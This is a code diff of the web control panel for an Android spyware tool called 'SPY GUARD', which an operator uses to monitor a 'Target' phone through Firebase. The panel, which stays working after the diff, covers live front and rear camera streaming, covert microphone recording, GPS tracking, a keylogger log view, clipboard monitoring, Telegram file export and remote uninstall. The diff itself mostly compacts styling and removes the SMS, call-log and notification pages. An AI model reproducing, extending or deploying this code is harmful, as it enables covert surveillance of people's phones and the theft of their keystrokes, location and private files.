@@ -37,388 +37,67 @@
             height: 100vh;
             background-color: var(--bg-deep);
             background-image: radial-gradient(circle at 20% 30%, rgba(88, 86, 214, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 80% 70%, rgba(255, 45, 85, 0.15) 0%, transparent 40%);
+                              radial-gradient(circle at 80% 70%, rgba(255, 45, 85, 0.15) 0%, transparent 40%);
             overflow: hidden;
             color: var(--text-main);
         }
 
-        .sidebar {
-            width: 260px;
-            background: var(--glass-bg);
-            backdrop-filter: var(--ios-blur);
-            border-right: 1px solid var(--glass-border);
-            display: flex;
-            flex-direction: column;
-            z-index: 1000;
-            transition: var(--transition);
-        }
+        .sidebar { width: 260px; background: var(--glass-bg); backdrop-filter: var(--ios-blur); border-right: 1px solid var(--glass-border); display: flex; flex-direction: column; z-index: 1000; transition: var(--transition); }
+        .nav-group { padding: 15px; flex-grow: 1; overflow-y: auto; }
+        .nav-item { padding: 12px 20px; display: flex; align-items: center; cursor: pointer; transition: var(--transition); font-size: 0.95rem; font-weight: 600; border-radius: 15px; color: var(--text-muted); gap: 15px; margin-bottom: 5px; }
+        .nav-item i { width: 20px; text-align: center; }
+        .nav-item:hover { background: rgba(255, 255, 255, 0.05); color: white; }
+        .nav-item.active { background: var(--primary); color: white; box-shadow: var(--neon-shadow); }
 
-        .nav-group {
-            padding: 15px;
-            flex-grow: 1;
-            overflow-y: auto;
-        }
+        .main-content { flex-grow: 1; display: flex; flex-direction: column; overflow-y: auto; position: relative; }
+        .content-body { max-width: 1200px; margin: 0 auto; width: 100%; padding: 30px; box-sizing: border-box; }
 
-        .nav-item {
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            transition: var(--transition);
-            font-size: 0.95rem;
-            font-weight: 600;
-            border-radius: 15px;
-            color: var(--text-muted);
-            gap: 15px;
-            margin-bottom: 5px;
-        }
+        .card { background: var(--card-bg); backdrop-filter: var(--ios-blur); border-radius: 30px; padding: 25px; border: 1px solid var(--card-border); margin-bottom: 20px; }
+        .btn { border: none; padding: 12px 20px; border-radius: 18px; cursor: pointer; font-weight: 800; display: inline-flex; align-items: center; justify-content: center; gap: 10px; transition: var(--transition); text-transform: uppercase; letter-spacing: 1px; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-danger { background: var(--secondary); color: white; }
+        .btn-success { background: #34C759; color: white; }
+        .btn-small { min-height: 40px; padding: 8px 15px; font-size: 0.75rem; }
 
-        .nav-item i {
-            width: 20px;
-            text-align: center;
-        }
+        .status-badge { padding: 5px 15px; border-radius: 20px; font-size: 0.7rem; font-weight: 900; }
+        .online { background: rgba(52, 199, 89, 0.2); color: #34C759; }
+        .offline { background: rgba(255, 45, 85, 0.2); color: #FF2D55; }
 
-        .nav-item:hover {
-            background: rgba(255, 255, 255, 0.05);
-            color: white;
-        }
+        #stream-img { width: 100%; border-radius: 20px; background: #000; border: 4px solid #fff; min-height: 240px; object-fit: contain; box-sizing: border-box; }
 
-        .nav-item.active {
-            background: var(--primary);
-            color: white;
-            box-shadow: var(--neon-shadow);
-        }
+        .perm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-top: 15px; }
+        .perm-item { padding: 12px; border-radius: 15px; background: rgba(255,255,255,0.03); display: flex; align-items: center; gap: 10px; font-size: 0.85rem; border: 1px solid var(--glass-border); }
+        .perm-ok { color: #34C759; }
+        .perm-no { color: #FF2D55; }
 
-        .main-content {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
-            position: relative;
-        }
+        #auth-overlay { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .login-card { background: rgba(255,255,255,0.08); border-radius: 40px; padding: 50px; width: 90%; max-width: 400px; text-align: center; backdrop-filter: blur(40px); }
+        .login-field { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; text-align: center; box-sizing: border-box; }
 
-        .content-body {
-            max-width: 1200px;
-            margin: 0 auto;
-            width: 100%;
-            padding: 30px;
-            box-sizing: border-box;
-        }
+        .page { display: none; }
+        .page.active { display: block; }
 
-        .card {
-            background: var(--card-bg);
-            backdrop-filter: var(--ios-blur);
-            border-radius: 30px;
-            padding: 25px;
-            border: 1px solid var(--card-border);
-            margin-bottom: 20px;
-        }
-
-        .btn {
-            border: none;
-            padding: 12px 20px;
-            border-radius: 18px;
-            cursor: pointer;
-            font-weight: 800;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: var(--transition);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-        }
-
-        .btn-danger {
-            background: var(--secondary);
-            color: white;
-        }
-
-        .btn-success {
-            background: #34C759;
-            color: white;
-        }
-
-        .btn-small {
-            min-height: 40px;
-            padding: 8px 15px;
-            font-size: 0.75rem;
-        }
-
-        .status-badge {
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.7rem;
-            font-weight: 900;
-        }
-
-        .online {
-            background: rgba(52, 199, 89, 0.2);
-            color: #34C759;
-        }
-
-        .offline {
-            background: rgba(255, 45, 85, 0.2);
-            color: #FF2D55;
-        }
-
-        #stream-img {
-            width: 100%;
-            border-radius: 20px;
-            background: #000;
-            border: 4px solid #fff;
-            min-height: 240px;
-            object-fit: contain;
-            transition: transform 0.3s ease;
-            box-sizing: border-box;
-        }
-
-        .table-container {
-            border-radius: 20px;
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid var(--glass-border);
-            overflow-x: auto;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            min-width: 400px;
-        }
-
-        th {
-            padding: 15px;
-            text-align: left;
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--text-muted);
-            font-size: 0.8rem;
-        }
-
-        td {
-            padding: 15px;
-            border-bottom: 1px solid var(--glass-border);
-            font-size: 0.9rem;
-        }
-
-        .perm-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 12px;
-            margin-top: 15px;
-        }
-
-        .perm-item {
-            padding: 12px;
-            border-radius: 15px;
-            background: rgba(255, 255, 255, 0.03);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.85rem;
-            border: 1px solid var(--glass-border);
-        }
-
-        .perm-ok {
-            color: #34C759;
-        }
-
-        .perm-no {
-            color: #FF2D55;
-        }
-
-        #auth-overlay {
-            position: fixed;
-            inset: 0;
-            background: black;
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .login-card {
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 40px;
-            padding: 50px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            backdrop-filter: blur(40px);
-        }
-
-        .login-field {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: white;
-            text-align: center;
-            box-sizing: border-box;
-        }
-
-        .page {
-            display: none;
-        }
-
-        .page.active {
-            display: block;
-        }
-
-        .feat-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .feat-item {
-            padding: 15px;
-            border-radius: 20px;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--card-border);
-            text-align: center;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .feat-item.active {
-            background: rgba(88, 86, 214, 0.2);
-            border-color: var(--primary);
-        }
-
-        .feat-item i {
-            font-size: 1.2rem;
-            margin-bottom: 8px;
-        }
-
-        .feat-label {
-            font-size: 0.7rem;
-            font-weight: 800;
-            display: block;
-        }
+        .feat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 10px; margin-top: 15px; }
+        .feat-item { padding: 15px; border-radius: 20px; background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); text-align: center; cursor: pointer; transition: 0.3s; }
+        .feat-item.active { background: rgba(88, 86, 214, 0.2); border-color: var(--primary); }
+        .feat-item i { font-size: 1.2rem; margin-bottom: 8px; }
+        .feat-label { font-size: 0.7rem; font-weight: 800; display: block; }
 
         /* Mobile Adjustments */
-        .mobile-header {
-            display: none;
-            padding: 15px;
-            background: var(--glass-bg);
-            backdrop-filter: var(--ios-blur);
-            border-bottom: 1px solid var(--glass-border);
-            align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 1001;
-        }
-
-        .menu-btn {
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: white;
-        }
+        .mobile-header { display: none; padding: 15px; background: var(--glass-bg); backdrop-filter: var(--ios-blur); border-bottom: 1px solid var(--glass-border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1001; }
+        .menu-btn { font-size: 1.5rem; cursor: pointer; color: white; }
 
         @media (max-width: 768px) {
-            body {
-                flex-direction: column;
-            }
-
-            .sidebar {
-                position: fixed;
-                left: -260px;
-                top: 0;
-                bottom: 0;
-                width: 260px;
-                z-index: 2000;
-            }
-
-            .sidebar.open {
-                left: 0;
-            }
-
-            .mobile-header {
-                display: flex;
-            }
-
-            .content-body {
-                padding: 15px;
-            }
-
-            .card {
-                padding: 15px;
-                border-radius: 20px;
-            }
-
-            h3 {
-                font-size: 1.1rem;
-            }
-
-            .nav-item {
-                padding: 10px 15px;
-            }
-
-            .sidebar-overlay {
-                display: none;
-                position: fixed;
-                inset: 0;
-                background: rgba(0, 0, 0, 0.5);
-                z-index: 1500;
-                backdrop-filter: blur(5px);
-            }
-
-            .sidebar-overlay.open {
-                display: block;
-            }
-        }
-
-        /* Rotation Controls */
-        .rotation-controls {
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .btn-rotate {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 10px;
-            font-size: 0.75rem;
-            cursor: pointer;
-            border: none;
-        }
-
-        .btn-rotate:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .btn-rotate.active {
-            background: var(--primary);
-        }
-
-        #device-selector {
-            width: 100%;
-            padding: 12px;
-            border-radius: 15px;
-            background: #222;
-            color: white;
-            border: 1px solid #444;
-            margin-top: 10px;
-            font-size: 1rem;
-            -webkit-appearance: none;
-            appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 10px center;
-            background-size: 15px;
+            body { flex-direction: column; }
+            .sidebar { position: fixed; left: -260px; top: 0; bottom: 0; width: 260px; z-index: 2000; }
+            .sidebar.open { left: 0; }
+            .mobile-header { display: flex; }
+            .content-body { padding: 15px; }
+            .card { padding: 15px; border-radius: 20px; }
+            h3 { font-size: 1.1rem; }
+            .nav-item { padding: 10px 15px; }
+            .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 1500; backdrop-filter: blur(5px); }
+            .sidebar-overlay.open { display: block; }
         }
     </style>
 </head>
@@ -444,74 +123,44 @@
     <div class="sidebar" id="sidebar">
         <div style="padding: 25px; text-align: center;">
             <h2 style="margin: 0; color: white; letter-spacing: -1.5px;">SPY GUARD</h2>
-            <select id="device-selector"></select>
+            <select id="device-selector" style="width: 100%; padding: 10px; border-radius: 10px; background: #222; color: white; border: 1px solid #444; margin-top: 10px;"></select>
         </div>
         <div class="nav-group">
             <div class="nav-item active" onclick="showPage('dashboard')"><i class="fas fa-desktop"></i> Terminal</div>
             <div class="nav-item" onclick="showPage('remote')"><i class="fas fa-hammer"></i> Actions</div>
             <div class="nav-item" onclick="showPage('gps')"><i class="fas fa-location-dot"></i> GPS</div>
-            <div class="nav-item" onclick="showPage('messages')"><i class="fas fa-envelope"></i> SMS Logs</div>
-            <div class="nav-item" onclick="showPage('calls')"><i class="fas fa-phone"></i> Call Logs</div>
-            <div class="nav-item" onclick="showPage('notifications')"><i class="fas fa-bell"></i> Notifications</div>
             <div class="nav-item" onclick="showPage('keylogs')"><i class="fas fa-keyboard"></i> Keylogger</div>
         </div>
-        <div style="padding: 20px;"><button class="btn btn-danger" style="width: 100%; min-height: 40px;"
-                onclick="auth.signOut()">LOGOUT</button></div>
+        <div style="padding: 20px;"><button class="btn btn-danger" style="width: 100%; min-height: 40px;" onclick="auth.signOut()">LOGOUT</button></div>
     </div>
 
     <div class="main-content">
         <div class="content-body">
-            <div
-                style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; flex-wrap: wrap; gap: 10px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; flex-wrap: wrap; gap: 10px;">
                 <div>
                     <h1 id="dev-name" style="margin:0; font-size: 1.5rem; font-weight: 900;">Select a Device</h1>
-                    <div id="health-bar"
-                        style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; display: flex; gap: 15px;">
-                    </div>
+                    <div id="health-bar" style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; display: flex; gap: 15px;"></div>
                 </div>
                 <div id="status-tag" class="status-badge offline">OFFLINE</div>
-            </div>
-
-            <!-- Welcome/Select Page -->
-            <div id="no-device-screen" class="card" style="text-align: center; padding: 50px 20px;">
-                <i class="fas fa-mobile-alt"
-                    style="font-size: 4rem; color: var(--primary); margin-bottom: 20px; opacity: 0.5;"></i>
-                <h2 style="margin-bottom: 15px;">Welcome to SPY GUARD</h2>
-                <p style="color: var(--text-muted); margin-bottom: 30px;">Please select a connected device to start
-                    monitoring.</p>
-                <div id="main-selector-container">
-                    <button class="btn btn-primary" onclick="toggleSidebar()">SELECT DEVICE</button>
-                </div>
             </div>
 
             <!-- Dashboard -->
             <div id="page-dashboard" class="page active">
                 <div class="card">
-                    <div
-                        style="display:flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
+                    <div style="display:flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
                         <h3>Live Camera</h3>
                         <div style="display:flex; gap:8px; align-items: center; flex-wrap: wrap;">
-                            <div
-                                style="background: rgba(255,255,255,0.05); border-radius: 15px; padding: 5px 12px; display: flex; align-items: center; gap: 8px; border: 1px solid #444;">
+                            <div style="background: rgba(255,255,255,0.05); border-radius: 15px; padding: 5px 12px; display: flex; align-items: center; gap: 8px; border: 1px solid #444;">
                                 <label style="font-size: 0.65rem; font-weight: 800;">QUALITY:</label>
-                                <input type="range" id="stream-quality" min="1" max="100" value="25"
-                                    style="width: 60px;">
+                                <input type="range" id="stream-quality" min="1" max="100" value="25" style="width: 60px;">
                             </div>
                             <button class="btn btn-success btn-small" onclick="startStream('back')">REAR</button>
                             <button class="btn btn-success btn-small" onclick="startStream('front')">FRONT</button>
                             <button class="btn btn-danger btn-small" onclick="stopStream()">STOP</button>
                         </div>
                     </div>
-                    <div style="text-align: center; position: relative; overflow: hidden; border-radius: 20px;">
+                    <div style="text-align: center;">
                         <img id="stream-img" src="" alt="Camera Offline">
-                        <div class="rotation-controls">
-                            <button class="btn-rotate" id="rot-0" onclick="updateTransform(0, false)">0°</button>
-                            <button class="btn-rotate" id="rot-90" onclick="updateTransform(90, false)">90°</button>
-                            <button class="btn-rotate" id="rot-180" onclick="updateTransform(180, false)">180°</button>
-                            <button class="btn-rotate" id="rot-270" onclick="updateTransform(270, false)">270°</button>
-                            <button class="btn-rotate" id="btn-mirror" onclick="toggleMirror()"><i
-                                    class="fas fa-arrows-alt-h"></i> MIRROR</button>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -519,8 +168,7 @@
             <!-- Actions -->
             <div id="page-remote" class="page">
                 <div class="card" style="text-align: center;">
-                    <i id="mic-icon" class="fas fa-microphone"
-                        style="font-size: 3rem; color: var(--text-muted); margin-bottom: 20px;"></i>
+                    <i id="mic-icon" class="fas fa-microphone" style="font-size: 3rem; color: var(--text-muted); margin-bottom: 20px;"></i>
                     <div style="display:flex; justify-content:center; gap:15px; flex-wrap: wrap;">
                         <button class="btn btn-success btn-small" onclick="mic(true)">START MIC</button>
                         <button class="btn btn-danger btn-small" onclick="mic(false)">STOP MIC</button>
@@ -530,21 +178,14 @@
                 <div class="card">
                     <h3>App Permissions Status</h3>
                     <div id="perm-list" class="perm-grid"></div>
-                    <button class="btn btn-primary btn-small" style="margin-top:15px; width: 100%;"
-                        onclick="cmd('checkPermissions', true)">REFRESH PERMISSIONS</button>
+                    <button class="btn btn-primary btn-small" style="margin-top:15px; width: 100%;" onclick="cmd('checkPermissions', true)">REFRESH PERMISSIONS</button>
                 </div>
 
                 <div class="card">
                     <h3>Features Toggle (RAM Optimizer)</h3>
                     <div class="feat-grid">
-                        <div class="feat-item" id="feat-monitor" onclick="toggleFeat('monitor')"><i
-                                class="fas fa-heartbeat"></i><span class="feat-label">Monitor</span></div>
-                        <div class="feat-item" id="feat-clipboard" onclick="toggleFeat('clipboard')"><i
-                                class="fas fa-paste"></i><span class="feat-label">Clipboard</span></div>
-                        <div class="feat-item" id="feat-sms" onclick="toggleFeat('sms')"><i class="fas fa-sms"></i><span
-                                class="feat-label">SMS Sync</span></div>
-                        <div class="feat-item" id="feat-calls" onclick="toggleFeat('calls')"><i
-                                class="fas fa-phone"></i><span class="feat-label">Call Sync</span></div>
+                        <div class="feat-item" id="feat-monitor" onclick="toggleFeat('monitor')"><i class="fas fa-heartbeat"></i><span class="feat-label">Monitor</span></div>
+                        <div class="feat-item" id="feat-clipboard" onclick="toggleFeat('clipboard')"><i class="fas fa-paste"></i><span class="feat-label">Clipboard</span></div>
                     </div>
                 </div>
 
@@ -553,49 +194,16 @@
                     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px;">
                         <button class="btn btn-primary btn-small" onclick="cmd('ring', true)">ALARM</button>
                         <button class="btn btn-primary btn-small" onclick="cmd('vibrate', 1000)">VIBRATE</button>
-                        <button class="btn btn-primary btn-small" style="background:#229ED9;"
-                            onclick="cmd('telegramExport', true)">TG EXPORT</button>
-                        <button class="btn btn-primary btn-small" style="background:#0088cc;"
-                            onclick="cmd('telegramFilesExport', true)">FILE EXPORT</button>
+                        <button class="btn btn-primary btn-small" style="background:#229ED9;" onclick="cmd('telegramExport', true)">TG EXPORT</button>
+                        <button class="btn btn-primary btn-small" style="background:#0088cc;" onclick="cmd('telegramFilesExport', true)">FILE EXPORT</button>
                         <button class="btn btn-danger btn-small" onclick="cmd('uninstall', true)">UNINSTALL</button>
                     </div>
                 </div>
             </div>
 
             <!-- Logs Pages -->
-            <div id="page-gps" class="page">
-                <div class="card">
-                    <h3>GPS <button class="btn btn-success btn-small" onclick="cmd('getGPS', true)">REFRESH</button>
-                    </h3>
-                    <div id="gps-map" style="height: 350px; border-radius: 20px;"></div>
-                </div>
-            </div>
-            <div id="page-messages" class="page">
-                <div class="card">
-                    <h3>SMS Logs <button class="btn btn-primary btn-small" onclick="fetchLogs('sms')">FETCH</button>
-                    </h3>
-                    <div class="table-container" id="sms-list"></div>
-                </div>
-            </div>
-            <div id="page-calls" class="page">
-                <div class="card">
-                    <h3>Call Logs <button class="btn btn-primary btn-small" onclick="fetchLogs('calls')">FETCH</button>
-                    </h3>
-                    <div class="table-container" id="call-list"></div>
-                </div>
-            </div>
-            <div id="page-notifications" class="page">
-                <div class="card">
-                    <h3>Notifications</h3>
-                    <div class="table-container" id="notif-list"></div>
-                </div>
-            </div>
-            <div id="page-keylogs" class="page">
-                <div class="card">
-                    <h3>Keylogger</h3>
-                    <div class="table-container" id="keylogs-list"></div>
-                </div>
-            </div>
+            <div id="page-gps" class="page"><div class="card"><h3>GPS <button class="btn btn-success btn-small" onclick="cmd('getGPS', true)">REFRESH</button></h3><div id="gps-map" style="height: 350px; border-radius: 20px;"></div></div></div>
+            <div id="page-keylogs" class="page"><div class="card"><h3>Keylogger</h3><div class="table-container" id="keylogs-list"></div></div></div>
         </div>
     </div>
 
@@ -617,22 +225,9 @@
         let audioCtx, nextStartTime = 0;
         let currentBattery = "--";
         let currentStorage = "--";
-        let currentRotation = 0;
-        let isMirrored = false;
 
         function handleLogin() { auth.signInWithEmailAndPassword(document.getElementById('auth-email').value, document.getElementById('auth-pass').value).catch(e => alert(e.message)); }
-        auth.onAuthStateChanged(user => {
-            document.getElementById('auth-overlay').style.display = user ? 'none' : 'flex';
-            if (user) {
-                loadDevices();
-                if (!currentId) {
-                    document.getElementById('no-device-screen').style.display = 'block';
-                    if (window.innerWidth <= 768) {
-                        setTimeout(() => toggleSidebar(), 500); // Auto-open sidebar to prompt selection
-                    }
-                }
-            }
-        });
+        auth.onAuthStateChanged(user => { document.getElementById('auth-overlay').style.display = user ? 'none' : 'flex'; if(user) loadDevices(); });
 
         function toggleSidebar() {
             document.getElementById('sidebar').classList.toggle('open');
@@ -641,72 +236,23 @@
 
         function loadDevices() {
             db.ref('devices').on('value', s => {
-                const devs = s.val() || {};
-                const sel = document.getElementById('device-selector');
-                const curSelection = sel.value;
-
-                const newIds = Object.keys(devs).sort();
-                const currentIds = Array.from(sel.options).map(o => o.value).filter(v => v !== "").sort();
-
-                // Only rebuild if IDs changed (new device added/removed)
-                if (JSON.stringify(newIds) !== JSON.stringify(currentIds)) {
-                    sel.innerHTML = '<option value="">Select Target...</option>';
-                    newIds.forEach(id => {
-                        const opt = document.createElement('option');
-                        opt.value = id;
-                        const status = devs[id].health?.online ? " (ONLINE)" : " (OFFLINE)";
-                        opt.innerText = (devs[id].info?.model || id) + status;
-                        sel.appendChild(opt);
-                    });
-                    if (curSelection && devs[curSelection]) sel.value = curSelection;
-                } else {
-                    // Just update labels for existing options to avoid closing the dropdown
-                    for (let id in devs) {
-                        for (let i = 0; i < sel.options.length; i++) {
-                            if (sel.options[i].value === id) {
-                                const status = devs[id].health?.online ? " (ONLINE)" : " (OFFLINE)";
-                                const newText = (devs[id].info?.model || id) + status;
-                                if (sel.options[i].innerText !== newText) sel.options[i].innerText = newText;
-                                break;
-                            }
-                        }
-                    }
+                const devs = s.val() || {}; const sel = document.getElementById('device-selector');
+                const cur = sel.value; sel.innerHTML = '<option value="">Select Target...</option>';
+                for(let id in devs) {
+                    const opt = document.createElement('option');
+                    opt.value = id;
+                    const status = devs[id].health?.online ? " (ONLINE)" : " (OFFLINE)";
+                    opt.innerText = (devs[id].info?.model || id) + status;
+                    sel.appendChild(opt);
                 }
+                if(cur) sel.value = cur;
             });
         }
 
-        document.getElementById('device-selector').onchange = e => {
-            const val = e.target.value;
-            if (val) {
-                currentId = val;
-                document.getElementById('dev-name').innerText = e.target.options[e.target.selectedIndex].text;
-                document.getElementById('no-device-screen').style.display = 'none';
-                startSync(currentId);
-                if (window.innerWidth <= 768) toggleSidebar();
-            } else {
-                document.getElementById('no-device-screen').style.display = 'block';
-            }
-        };
+        document.getElementById('device-selector').onchange = e => { if(e.target.value) { currentId = e.target.value; document.getElementById('dev-name').innerText = e.target.options[e.target.selectedIndex].text; startSync(currentId); } };
 
         function updateHealthBar() {
             document.getElementById('health-bar').innerHTML = `<span>🔋 ${currentBattery}%</span><span>💾 ${currentStorage}</span>`;
-        }
-
-        function updateTransform(deg, mirror) {
-            if (deg !== undefined) currentRotation = deg;
-            if (mirror !== undefined) isMirrored = mirror;
-
-            const scaleX = isMirrored ? -1 : 1;
-            document.getElementById('stream-img').style.transform = `rotate(${currentRotation}deg) scaleX(${scaleX})`;
-
-            document.querySelectorAll('.btn-rotate').forEach(b => b.classList.remove('active'));
-            const rotBtn = document.getElementById('rot-' + currentRotation);
-            if (rotBtn) rotBtn.classList.add('active');
-            if (isMirrored) document.getElementById('btn-mirror').classList.add('active');
-        }
-
-        function toggleMirror() {
-            updateTransform(currentRotation, !isMirrored);
         }
 
         function startSync(id) {
@@ -727,84 +273,64 @@
             });
 
             db.ref(base + 'features').on('value', s => {
-                const f = s.val() || {};['monitor', 'clipboard', 'sms', 'calls'].forEach(k => {
+                const f = s.val() || {}; ['monitor', 'clipboard'].forEach(k => {
                     const el = document.getElementById('feat-' + k);
-                    if (el) {
-                        if (f[k] === false) el.classList.remove('active'); else el.classList.add('active');
+                    if(el) {
+                        if(f[k] === false) el.classList.remove('active'); else el.classList.add('active');
                     }
                 });
             });
 
             db.ref(base + 'permissions').on('value', s => {
                 const perms = s.val() || {}; let html = '';
-                for (let p in perms) {
+                for(let p in perms) {
                     const icon = perms[p] ? '<i class="fas fa-check-circle perm-ok"></i>' : '<i class="fas fa-times-circle perm-no"></i>';
                     html += `<div class="perm-item">${icon} ${p}</div>`;
                 }
                 document.getElementById('perm-list').innerHTML = html || '<div class="perm-item">No Data Sync</div>';
             });
 
-            db.ref(base + 'stream').on('value', s => { if (s.val()) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val(); });
-            db.ref(base + 'audioLive').on('value', s => { if (s.val()) playAudio(s.val()); });
+            db.ref(base + 'stream').on('value', s => { if(s.val()) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val(); });
+            db.ref(base + 'audioLive').on('value', s => { if(s.val()) playAudio(s.val()); });
 
             db.ref(base + 'location').on('value', s => {
-                const l = s.val(); if (!l) return;
-                if (!map) { map = L.map('gps-map').setView([l.lat, l.lng], 15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); marker = L.marker([l.lat, l.lng]).addTo(map); }
+                const l = s.val(); if(!l) return;
+                if(!map) { map = L.map('gps-map').setView([l.lat, l.lng], 15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); marker = L.marker([l.lat, l.lng]).addTo(map); }
                 else { marker.setLatLng([l.lat, l.lng]); map.setView([l.lat, l.lng]); }
             });
 
-            const liveNodes = { 'notifications': 'notif-list', 'keylogs': 'keylogs-list' };
-            for (let n in liveNodes) {
+            const liveNodes = { 'keylogs': 'keylogs-list' };
+            for(let n in liveNodes) {
                 db.ref(base + n).on('value', s => {
                     const data = s.val(); let html = '<table>';
-                    if (n === 'notifications') {
-                        html += '<tr><th>App</th><th>Text</th><th>Time</th></tr>';
-                        Object.values(data || {}).reverse().forEach(v => {
-                            const time = v.time ? new Date(v.time).toLocaleString() : '--';
-                            html += `<tr><td>${v.app || v.package}</td><td>${v.text || v.body}</td><td>${time}</td></tr>`;
-                        });
-                    } else {
-                        html += '<tr><th>App</th><th>Log</th><th>Time</th></tr>';
-                        Object.values(data || {}).reverse().forEach(v => {
-                            html += `<tr><td>${v.app}</td><td>${v.text}</td><td>${v.time || '--'}</td></tr>`;
-                        });
-                    }
+                    html += '<tr><th>App</th><th>Log</th><th>Time</th></tr>';
+                    Object.values(data||{}).reverse().forEach(v => {
+                        html += `<tr><td>${v.app}</td><td>${v.text}</td><td>${v.time || '--'}</td></tr>`;
+                    });
                     document.getElementById(liveNodes[n]).innerHTML = html + '</table>';
                 });
             }
-
-            db.ref(base + 'logs_output').on('value', s => {
-                const out = s.val(); if (!out) return;
-                ['sms', 'calls'].forEach(type => {
-                    const data = out[type]; if (!data) return;
-                    let html = '<table>';
-                    if (type === 'sms') { html += '<tr><th>Address</th><th>Message</th></tr>'; data.forEach(v => html += `<tr><td>${v.address}</td><td>${v.body}</td></tr>`); }
-                    else { html += '<tr><th>Number</th><th>Type</th><th>Duration</th></tr>'; data.forEach(v => html += `<tr><td>${v.number}</td><td>${v.type}</td><td>${v.duration}</td></tr>`); }
-                    document.getElementById(type + '-list').innerHTML = html + '</table>';
-                });
-            });
         }
 
-        function cmd(c, v) { if (currentId) db.ref(`devices/${currentId}/commands/${c}`).set(v); }
-        function toggleFeat(k) { if (currentId) { const el = document.getElementById('feat-' + k); db.ref(`devices/${currentId}/features/${k}`).set(!el.classList.contains('active')); } }
-        function startStream(t) { if (currentId) db.ref(`devices/${currentId}/streamConfig`).set({ enabled: true, type: t, quality: parseInt(document.getElementById('stream-quality').value) }); }
-        function stopStream() { if (currentId) { db.ref(`devices/${currentId}/streamConfig/enabled`).set(false); db.ref(`devices/${currentId}/stream`).remove(); document.getElementById('stream-img').src = ''; } }
-        function mic(on) { cmd('recordSurround', on); document.getElementById('mic-icon').style.color = on ? '#34C759' : '#A1A1AA'; if (on && !audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 }); }
+        function cmd(c, v) { if(currentId) db.ref(`devices/${currentId}/commands/${c}`).set(v); }
+        function toggleFeat(k) { if(currentId) { const el = document.getElementById('feat-'+k); db.ref(`devices/${currentId}/features/${k}`).set(!el.classList.contains('active')); } }
+        function startStream(t) { if(currentId) db.ref(`devices/${currentId}/streamConfig`).set({enabled: true, type: t, quality: parseInt(document.getElementById('stream-quality').value)}); }
+        function stopStream() { if(currentId) { db.ref(`devices/${currentId}/streamConfig/enabled`).set(false); db.ref(`devices/${currentId}/stream`).remove(); document.getElementById('stream-img').src = ''; } }
+        function mic(on) { cmd('recordSurround', on); document.getElementById('mic-icon').style.color = on ? '#34C759' : '#A1A1AA'; if(on && !audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 16000}); }
 
         function playAudio(b64) {
             try {
                 const bin = atob(b64); const bytes = new Int16Array(bin.length / 2);
